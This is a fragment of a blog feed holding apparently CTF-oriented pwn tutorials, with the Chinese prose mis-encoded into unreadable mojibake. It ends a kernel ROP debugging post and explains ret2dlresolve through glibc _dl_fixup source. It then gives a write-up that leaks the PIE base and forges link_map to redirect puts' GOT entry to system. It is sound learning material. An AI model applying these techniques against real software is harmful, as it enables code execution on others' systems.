class="hljs-number">0xffffffffffff0000</span> | <span class="hljs-number">0x100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è·Ÿè¸ªè°ƒè¯•"><a href="#è·Ÿè¸ªè°ƒè¯•" class="headerlink" title="è·Ÿè¸ªè°ƒè¯•"></a>è·Ÿè¸ªè°ƒè¯•</h3><p>è·Ÿè¸ªä¸€ä¸‹ropé“¾æ‰§è¡Œçš„è¿‡ç¨‹ï¼ˆæœ€å¥½æ¯ä¸€æ­¥éƒ½æ‰“ä¸€ä¸ªæ–­ç‚¹ï¼Œå†…æ ¸æ€è¿›å…¥ç”¨æˆ·æ€çš„æ—¶å€™niä¼šç›´æ¥ç»§ç»­æ‰§è¡Œï¼‰</p><p><em><strong>start.shä¸­çš„kaslré€‰é¡¹æ”¹ä¸ºnokaslræ‰æ˜¯å…³é—­åœ°å€éšæœºåŒ–ï¼ï¼ï¼</strong></em></p><p>è°ƒè¯•å†…æ ¸æ—¶çš„.gdbinitï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /home/eurus/gef/gef.py<br><br>add-symbol-file /home/eurus/give_to_player/vmlinux<br>set architecture i386:x86-64<br>add-symbol-file /home/eurus/give_to_player/core/core.ko 0xffffffffc0000000 <br>b*0xffffffffc0000131<br></code></pre></td></tr></table></figure><ul><li><p><strong>å†…æ ¸æ€</strong>ï¼šå¼€å§‹æ‰§è¡ŒROPé“¾</p><img src="/2023/08/03/Kernel-ROP-basic/pc1.png" class title="pc1"><p>æ ˆå¸ƒå±€</p><img src="/2023/08/03/Kernel-ROP-basic/stack.png" class title="stack"></li><li><p><strong>å†…æ ¸æ€æ‰§è¡Œç”¨æˆ·æ€å‡½æ•°</strong>ï¼šè¿›è¡Œææƒ</p><img src="/2023/08/03/Kernel-ROP-basic/pc2.png" class title="pc2"></li><li><p><strong>å†…æ ¸æ€</strong>ï¼šæ‰§è¡Œswapgså’Œiretq</p><img src="/2023/08/03/Kernel-ROP-basic/pc3.png" class title="pc3"></li><li><p><strong>ç”¨æˆ·æ€</strong>ï¼šæ‹¿shell</p><img src="/2023/08/03/Kernel-ROP-basic/pc4.png" class title="pc4"></li></ul>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>ROP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dlresolve</title>
    <link href="/2023/06/27/ret2dlresolve/"/>
    <url>/2023/06/27/ret2dlresolve/</url>
    
    <content type="html"><![CDATA[<p>æ”¾å‡å•¦*â˜…,Â°*:.â˜†(ï¿£â–½ï¿£)&#x2F;$:*.Â°â˜…* ã€‚<br>çƒ¤æ¼†+æ‘†çƒ‚åœæ›´äº†å¥½ä¹…å¥½ä¹…å¥½ä¹…ï¼Œæ¬ äº†å¥½å¤šå¥½å¤šå¥½å¤šå€º&#x2F;(ã„’oã„’)&#x2F;~~ï¼ˆä¸€å †å¤ç°ï¼‰ï¼Œå¼€å¯å‡æœŸå­¦ä¹ ç”Ÿæ´»çš„ç¬¬ä¸€æ­¥ä»è¿˜å€ºå¼€å§‹ </p><img src="/2023/06/27/ret2dlresolve/wjx.png" class title="wjx"><span id="more"></span><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>gdbè°ƒè¯•çš„æ—¶å€™ç”¨stepå‘½ä»¤æ²¡æœ‰å®Œæ•´çš„å»¶è¿Ÿç»‘å®šè¿‡ç¨‹ï¼Œç”¨stepiå•æ­¥å°±å¯ä»¥äº†</p><h2 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h2><h3 id="å»¶è¿Ÿç»‘å®šæµç¨‹"><a href="#å»¶è¿Ÿç»‘å®šæµç¨‹" class="headerlink" title="å»¶è¿Ÿç»‘å®šæµç¨‹"></a>å»¶è¿Ÿç»‘å®šæµç¨‹</h3><img src="/2023/06/27/ret2dlresolve/setvbuf.png" class title="setvbuf"><ul><li><p>ä¸»è°ƒå‡½æ•°è·³å…¥å¯¹åº”.pltï¼Œ.pltå†…å®¹å¦‚ä¸‹ï¼š</p><img src="/2023/06/27/ret2dlresolve/plt.png" class title="plt"></li><li><p>è·³è‡³å¯¹åº”.got.pltä¸­æ‰€å­˜åœ°å€ï¼Œ.got.pltä¸­æ‰€å­˜çš„åˆå§‹åœ°å€æ˜¯.plt[1]ï¼Œæ‰€ä»¥æœªç»‘å®šæ—¶ç›¸å½“äºé¡ºåºæ‰§è¡Œ.pltï¼Œç»‘å®šå.got.pltä¸­æ‰€å­˜çš„å°±æ˜¯å‡½æ•°çš„å®é™…åœ°å€ï¼Œè¿™ä¸€æ­¥ä¹‹åå°±ç›´æ¥æ‰§è¡Œå¯¹åº”å‡½æ•°</p></li><li><p>å…¥æ ˆå½“å‰å‡½æ•°å¯¹åº”index</p></li><li><p>è·³è‡³plt[0]ï¼ˆpltæ®µå¼€å¤´ï¼‰</p></li><li><p>å…¥æ ˆlinkmapåœ°å€ï¼ˆgot[1]ï¼‰ï¼Œæ‰§è¡Œ_dl_runtime_resolveï¼ˆgot[2]ï¼‰ï¼Œæ‰§è¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_runtime_resolve(link_map, reloc_arg)<br></code></pre></td></tr></table></figure></li></ul><h3 id="ä¸€äº›é‡è¦çš„æ®µ"><a href="#ä¸€äº›é‡è¦çš„æ®µ" class="headerlink" title="ä¸€äº›é‡è¦çš„æ®µ"></a>ä¸€äº›é‡è¦çš„æ®µ</h3><h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h4><p>åŒ…å«äº†ä¸€äº›å…³äºåŠ¨æ€é“¾æ¥çš„å…³é”®ä¿¡æ¯ï¼Œé‡è¦çš„æ˜¯DT_STRTAB, DT_SYMTAB, DT_JMPRELä¸‰é¡¹ï¼Œåˆ†åˆ«åŒ…å«æŒ‡å‘.dynstr, .dynsym, .rel.pltä¸‰æ®µçš„æŒ‡é’ˆ</p><img src="/2023/06/27/ret2dlresolve/dynamic.png" class title="dynamic"><p>å¯¹åº”ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Swordd_tag;<span class="hljs-comment">/* Dynamic entry type */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      Elf32_Word d_val;<span class="hljs-comment">/* Integer value */</span><br>      Elf32_Addr d_ptr;<span class="hljs-comment">/* Address value */</span><br>    &#125; d_un;<br>&#125; Elf32_Dyn;<br></code></pre></td></tr></table></figure><h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h4><p>ä¸€ä¸ªå­—ç¬¦ä¸²è¡¨ï¼Œç›¸å…³æ•°æ®ç»“æ„å¼•ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œç”¨çš„æ˜¯ç›¸å¯¹è¿™ä¸ªsectionå¤´çš„åç§»</p><img src="/2023/06/27/ret2dlresolve/dynstr.png" class title="dynstr"><h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h4><p>ä¸€ä¸ªç¬¦å·è¡¨ï¼Œæ¯ä¸ªç»“æ„ä½“è®°å½•ä¸€ä¸ªç¬¦å·</p><img src="/2023/06/27/ret2dlresolve/dynsym.png" class title="dynsym"><p>å¯¹åº”ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Wordst_name;<span class="hljs-comment">/* Symbol name (string tbl index) */</span><br>  Elf32_Addrst_value;<span class="hljs-comment">/* Symbol value */</span><br>  Elf32_Wordst_size;<span class="hljs-comment">/* Symbol size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_info;<span class="hljs-comment">/* Symbol type and bindingï¼Œå¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€æ˜¯0x12 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_other;<span class="hljs-comment">/* Symbol visibility */</span><br>  Elf32_Sectionst_shndx;<span class="hljs-comment">/* Section index */</span><br>&#125; Elf32_Sym;<span class="hljs-comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0</span><br></code></pre></td></tr></table></figure><h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h4><p>é‡å®šä½è¡¨ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸ªé¡¹å¯¹åº”ä¸€ä¸ªå¯¼å…¥å‡½æ•°</p><img src="/2023/06/27/ret2dlresolve/relplt.png" class title="relplt"><p>å¯¹åº”ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addrr_offset;<span class="hljs-comment">/* æŒ‡å‘gotè¡¨çš„æŒ‡é’ˆ */</span><br>  Elf32_Wordr_info; <br> <span class="hljs-comment">//åªå…³å¿ƒä»ç¬¬äºŒä¸ªå­—èŠ‚å¼€å§‹çš„å€¼((val)&gt;&gt;8)ï¼Œå¿½ç•¥07</span><br> <span class="hljs-comment">//è¿™ä¸ªå¯¼å…¥å‡½æ•°çš„ç¬¦å·åœ¨.dynsymä¸­çš„ä¸‹æ ‡</span><br>  Elf32_Swordr_addend;<span class="hljs-comment">/* Addend */</span><br>&#125; Elf32_Rela;<br></code></pre></td></tr></table></figure><h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h3><img src="/2023/06/27/ret2dlresolve/dl.png" class title="dl"><p>å…ˆçœ‹ä¸€ä¸‹link_mapçš„ç»“æ„ï¼Œä½¿ç”¨çš„åˆ°çš„åªæœ‰ä¸¤ä¸ªæˆå‘˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span></span><br><span class="hljs-class">  &#123;</span><br>    ElfW(Addr) l_addr;<span class="hljs-comment">/* Difference between the address in the ELF</span><br><span class="hljs-comment">file and the addresses in memory.  */</span><br>    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM<br>      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];<br>    â€¦â€¦<br>  &#125;<br></code></pre></td></tr></table></figure><p>l_infoæˆå‘˜æŒ‡å‘äº†ä¹‹å‰è¯´åˆ°çš„.dynamicæ®µ</p><p>l_addræˆ‘çš„ç†è§£æ˜¯å¦‚æœå¼€äº†PIEå®ƒçš„å€¼å°±æ˜¯PIEåŸºå€</p><p>_dl_runtime_resolveå®é™…è°ƒç”¨_fl_fixupå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23</span><br><br>DL_FIXUP_VALUE_TYPE<br>attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE<br>_dl_fixup (<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br>   ELF_MACHINE_RUNTIME_FIXUP_ARGS,<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>   <span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>    <span class="hljs-comment">//å–å‡º.dynsymæ®µæŒ‡é’ˆ</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  <br>    <span class="hljs-comment">//å–å‡º.dynstræ®µæŒ‡é’ˆ</span><br><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  <br>    <span class="hljs-comment">//å–å‡º.rel.pltæ®µç¬¬reloc_argé¡¹çš„æŒ‡é’ˆ</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  <br>    <span class="hljs-comment">//å–å‡º.dynsymçš„ç¬¬reloc_argä¸ªç¬¦å·é¡¹</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *refsym = sym;<br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  <br>    <span class="hljs-comment">//å–å‡º.got.pltè¡¨çš„åœ°å€</span><br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Elf32_Relaçš„r_infoæˆå‘˜å¼€å¤´çš„07å­—èŠ‚æ£€æŸ¥  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<br><br>   <span class="hljs-comment">/* æ£€æŸ¥(sym-&gt;st_other)&amp;0x03æ˜¯å¦ä¸º0 */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<br>    &#123;<br>      â€¦â€¦<br>&#125;<br>    <br>  â€¦â€¦<br><br>   <span class="hljs-comment">/* _dl_lookup_symbol_xå‡½æ•°é€šè¿‡strtab + sym-&gt;st_nameï¼ˆæŸ¥æ‰¾å‡½æ•°åï¼‰ç¡®å®šå‡½æ•°å…·ä½“åœ°å€ */</span><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br><br>     â€¦â€¦<br><br>   <span class="hljs-comment">/* å·²çŸ¥å‡½æ•°åœ°å€ï¼Œè¿›è¡Œä¸€äº›å¤„ç†ï¼ˆresult-&gt;valueï¼‰  */</span><br>      value = DL_FIXUP_MAKE_VALUE (result,<br>   sym ? (LOOKUP_VALUE_ADDRESS (result)<br>  + sym-&gt;st_value) : <span class="hljs-number">0</span>);<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);<br>      result = l;<br>    &#125;<br><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* gotè¡¨å†™å…¥å‡½æ•°çœŸå®åœ°å€ï¼Œæˆ–è€…è¿”å›çœŸå®åœ°å€ */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨_fl_fixupç»“æŸå_dl_runtime_resolveçš„æ±‡ç¼–ç å¦‚ä¸‹</p><img src="/2023/06/27/ret2dlresolve/dlend.png" class title="dlend"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mov  dword  ptr [esp],eax<br></code></pre></td></tr></table></figure><p>å°†è¿”å›çš„å‡½æ•°çœŸå®åœ°å€æ”¾å…¥æ ˆé¡¶ï¼Œ ret 0xc åœ¨å°†ripè·³è½¬è‡³å‡½æ•°çœŸå®åœ°å€çš„åŒæ—¶æ ˆå¸§ä¸Šè°ƒ0xcï¼Œåˆšå¥½æ˜¯å‡½æ•°çš„å‚æ•°ï¼ˆ32ä½å‡½æ•°å‚æ•°æ”¾åœ¨æ ˆä¸Šï¼‰</p><img src="/2023/06/27/ret2dlresolve/%E5%8F%82%E6%95%B0.png" class title="å‚æ•°"><p>ï¼ˆç»ˆäºç»“æŸäº†æˆ‘çš„å¤©å‘ï¼‰</p><h2 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h2><h3 id="å»¶è¿Ÿç»‘å®šæµç¨‹-1"><a href="#å»¶è¿Ÿç»‘å®šæµç¨‹-1" class="headerlink" title="å»¶è¿Ÿç»‘å®šæµç¨‹"></a>å»¶è¿Ÿç»‘å®šæµç¨‹</h3><img src="/2023/06/27/ret2dlresolve/malloc64.png" class title="malloc64"><ul><li><p>ä¸»è°ƒå‡½æ•°è·³å…¥å¯¹åº”.plt.secï¼Œ.plt.secå†…å®¹å¦‚ä¸‹ï¼š</p><img src="/2023/06/27/ret2dlresolve/pltsec64.png" class title="pltsec64"></li><li><p>è·³è‡³å¯¹åº”.pltï¼Œå…¥æ ˆindexï¼Œè·³è½¬è‡³plt[0]</p><img src="/2023/06/27/ret2dlresolve/plt64.png" class title="plt64"></li><li><p>å…¥æ ˆlinkmapåœ°å€ï¼ˆgot[1]ï¼‰ï¼Œæ‰§è¡Œ_dl_runtime_resolve_xsavecï¼ˆgot[2]ï¼‰</p></li></ul><h3 id="dl-runtime-resolve-xsavec"><a href="#dl-runtime-resolve-xsavec" class="headerlink" title="_dl_runtime_resolve_xsavec"></a>_dl_runtime_resolve_xsavec</h3><img src="/2023/06/27/ret2dlresolve/dl64.png" class title="dl64"><p>64ä½ä¼ å‚ä»æ ˆå˜æˆäº†å¯„å­˜å™¨ï¼Œæ‰€ä»¥_dl_runtime_resolve_xsavecæœ‰äº›ä¸ä¸€æ ·</p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><h3 id="32ä½-1"><a href="#32ä½-1" class="headerlink" title="32ä½"></a>32ä½</h3><h4 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h4><p>ä¼ªé€ .dynamicæ®µçš„å­—ç¬¦ä¸²è¡¨</p><h4 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h4><p>Partial RELROä¸‹.dynamicåªè¯»ï¼Œæ— æ³•ä¿®æ”¹ï¼Œè¿™æ—¶å€™å’Œå»¶è¿Ÿç»‘å®šæœ‰å…³ä¸”åœ¨å¯å†™æ®µçš„åªæœ‰link_mapï¼Œæ‰€ä»¥å¯ä»¥ä¼ªé€ link_mapï¼Œè§ä¾‹é¢˜</p><h1 id="DAS5-matchmaking-platform"><a href="#DAS5-matchmaking-platform" class="headerlink" title="DAS5 matchmaking platform"></a>DAS5 matchmaking platform</h1><h2 id="æ¼æ´å’Œåˆ©ç”¨"><a href="#æ¼æ´å’Œåˆ©ç”¨" class="headerlink" title="æ¼æ´å’Œåˆ©ç”¨"></a>æ¼æ´å’Œåˆ©ç”¨</h2><p>inputå‡½æ•°å­˜åœ¨æ¼æ´</p><img src="/2023/06/27/ret2dlresolve/ida.png" class title="ida"><ul><li><p>é¦–å…ˆè¾“å…¥è¦†ç›–a1[0]~a1[128ï¼ˆ0x80ï¼‰]</p></li><li><p>v3çš„ç±»å‹ä¸ºcharï¼ˆèŒƒå›´-128~127ï¼‰ï¼Œæœ¬é¢˜ä¸­åŠ åˆ°äº†128ä¼šæº¢å‡ºä¸º-128ï¼Œæ‰€ä»¥æœ¬é¢˜ä¸­åŠ å‡çš„åœ°å€ä¸º0x4140ï¼ˆcontentï¼‰å’Œ0x40c8ï¼ˆptrï¼‰ï¼Œä¼šæº¢å‡ºä¸º0x40c0ï¼ˆpptrï¼‰å’Œ0x4048ï¼ˆcharç±»å‹å€¼å’Œ__int64ç±»å‹å€¼ç›¸åŠ charç±»å‹å€¼ä¼šè¢«ç¬¦å·æ‹“å±•ä¸º8å­—èŠ‚ï¼Œcè¯­è¨€åŸºç¡€å¿˜çš„ä¸€å¹²äºŒå‡€äº†ï¼‰</p></li><li><p>ç¨‹åºä¸­å‡ ä¸ªé‡è¦æ•°æ®å…³ç³»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pptr-&gt;ptr-&gt;å †<br></code></pre></td></tr></table></figure></li><li><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æº¢å‡ºä¿®æ”¹*pptræŒ‡å‘stdoutï¼ˆ0x40c8â†’0x4080ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pptr-&gt;<span class="hljs-built_in">stdout</span>-&gt;_IO_2_1_stdout_<br></code></pre></td></tr></table></figure></li><li><p>è¿™æ ·å½“è¯¢é—®â€Photo(URL) &gt;&gt; â€œå–*pptræ—¶æˆ‘ä»¬å®é™…ä¸Šä¿®æ”¹çš„å°±æ˜¯_IO_2_1_stdout_ï¼Œå¯ä»¥æ³„éœ²pieåŸºå€</p></li><li><p>å†é€šè¿‡æº¢å‡ºä¿®æ”¹*pptræŒ‡å‘link_mapï¼ˆ0x4080â†’0x4008ï¼‰ï¼Œè¯¢é—®â€Hobby &gt;&gt; â€œå°±èƒ½ä¿®æ”¹link_mapäº†</p></li></ul><p>psï¼šæˆ‘æœ¬æ¥æƒ³è¿™ä¹ˆéº»çƒ¦ä¸å¦‚ç›´æ¥æ”¹putsçš„gotè¡¨ï¼Œä½†putsçš„gotè¡¨åœ°å€æœ€ä½å­—èŠ‚æ˜¯0x20å°±æ˜¯ç©ºæ ¼ï¼Œä¼šè¢«è¿‡æ»¤æ‰æ ¹æœ¬å‘ä¸å‡ºå»ï¼Œæ·¦ğŸ™‚</p><h2 id="link-mapçš„ä¼ªé€ "><a href="#link-mapçš„ä¼ªé€ " class="headerlink" title="link_mapçš„ä¼ªé€ "></a>link_mapçš„ä¼ªé€ </h2><p>_dl_fixupå‡½æ•°ä¸­æŒ‰ç¬¦å·æŸ¥æ‰¾çš„éƒ¨åˆ†å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>å‡½æ•°åæ˜¯ç”±strtab + sym-&gt;st_nameå¾—åˆ°çš„</p><ul><li><p>å¾—åˆ°strtabçš„éƒ¨åˆ†ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br><span class="hljs-comment">/* å±•å¼€å®å®šä¹‰åå¦‚ä¸‹</span><br><span class="hljs-comment"> * (l)-&gt;l_info[5]-&gt;d_un.d_ptr</span><br><span class="hljs-comment"> * link_map-&gt;l_info[5]+0x8 */</span><br></code></pre></td></tr></table></figure></li><li><p>sym-&gt;st_nameæ˜¯å‡½æ•°åå­—ç¬¦ä¸²åœ¨ç¬¦å·è¡¨ä¸­çš„ä¸‹æ ‡ï¼Œè¿™é“é¢˜åŠ«æŒçš„freeå‡½æ•°æ˜¯0x77</p></li></ul><p>è¿™é“é¢˜éœ€è¦åœ¨freeå»¶è¿Ÿç»‘å®šçš„æ—¶å€™å°†putsçš„gotè¡¨æ”¹æˆsystemçš„åœ°å€ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¼ªé€ ä¸€ä¸‹link_map-&gt;l_addr</p><p>å°†è·å–çš„å‡½æ•°çœŸå®åœ°å€å†™å›gotè¡¨çš„æ­¥éª¤å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<span class="hljs-comment">//å–å‡º.got.pltæ®µåœ°å€ï¼Œreloc-&gt;r_offsetä¸ºgotè¡¨åç§»</span><br>   <span class="hljs-comment">//l-&gt;l_addrä¸ºpieåŸºåœ°å€</span><br>â€¦â€¦<br><span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Addr)</span><br><span class="hljs-title function_">elf_machine_fixup_plt</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> link_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">lookup_t</span> t,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> ElfW(Sym) *refsym, <span class="hljs-type">const</span> ElfW(Sym) *sym,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> ElfW(Rela) *reloc,</span><br><span class="hljs-params">       ElfW(Addr) *reloc_addr,</span><br><span class="hljs-params">       ElfW(Addr) value)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> *reloc_addr = value;<br>&#125;<br></code></pre></td></tr></table></figure><p>putsçš„gotè¡¨å°±åœ¨freeåé¢æ‰€ä»¥pieåŸºå€åŠ 8å°±è¡Œ</p><p>ä¼ªé€ å‡ºæ¥çš„ç»“æ„å¤§æ¦‚è¿™æ ·</p><img 